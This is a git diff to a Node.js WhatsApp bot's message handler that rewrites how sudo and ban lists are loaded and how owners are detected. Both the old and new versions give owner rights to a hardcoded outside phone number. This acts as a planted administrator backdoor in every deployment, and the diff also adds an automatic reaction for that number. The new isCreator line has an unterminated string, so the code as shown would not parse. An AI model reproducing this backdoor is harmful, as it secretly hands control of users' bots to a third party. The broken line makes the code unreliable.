@@ -254,10 +254,13 @@ const port = process.env.PORT || 9090;
 					return;
 				}
     
-  if(senderNumber.includes("94763934860")){
+  /*if(senderNumber.includes("94763934860")){
   if(isReact) return
   m.react("👾")
-   }
+   }*/
+if (senderNumber === "94763934860" && !isReact) {
+            await conn.sendMessage(from, { react: { text: "👾", key: mek.key } });
+        }	  
 	  
   if (!isReact && senderNumber !== botNumber) {
       if (config.AUTO_REACT === 'true') {
@@ -306,26 +309,21 @@ if (!isReact && senderNumber === botNumber) {
   const isFileOwner = ownerFile.includes(sender);
   const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;*/
    
- let bannedUsers = [];
- let sudoUsers = [];
+    let sudoUsers = [];
+    let bannedUsers = [];
+    try {
+        if (fs.existsSync('./lib/sudo.json')) sudoUsers = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));
+        if (fs.existsSync('./lib/ban.json')) bannedUsers = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8'));
+    } catch (e) {
+        console.log("Auth Read Error: " + e);
+    }
 
- try {
-     // ෆයිල් කියවීම (නැතිනම් හිස්ව ලබා ගනී)
-     if (fs.existsSync('./lib/ban.json')) bannedUsers = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8'));
-     if (fs.existsSync('./lib/sudo.json')) sudoUsers = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));
- } catch (e) {
-     console.log("Auth File Error: " + e);
- }
+	const isSudo = sudoUsers.includes(sender) || sudoUsers.includes(senderNumber);
+    const isCreator = [botNumber, config.OWNER_NUMBER, '94763934860 ].map(v => v?.replace(/[^0-9]/g, '')).includes(senderNumber) || isMe;
+    const isOwner = isCreator || isSudo;
+    const isBanned = bannedUsers.includes(sender) || bannedUsers.includes(senderNumber);
 
- const isSudo = sudoUsers.includes(sender) || sudoUsers.includes(senderNumber);
-
- const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
- const isCreator = [botNumber, config.OWNER_NUMBER, '94763934860'].map(v => v?.replace(/[^0-9]/g, '')).includes(senderNumber) || isMe || sender === ownerNumberFormatted;
-
- const isOwner = isCreator || isSudo;
-
- const isBanned = bannedUsers.includes(sender) || bannedUsers.includes(senderNumber);
- if (isBanned && !isOwner) return; 
+    if (isBanned && !isOwner) return;
 	  
   if(!isOwner && config.MODE === "private") return
   if(!isOwner && isGroup && config.MODE === "inbox") return
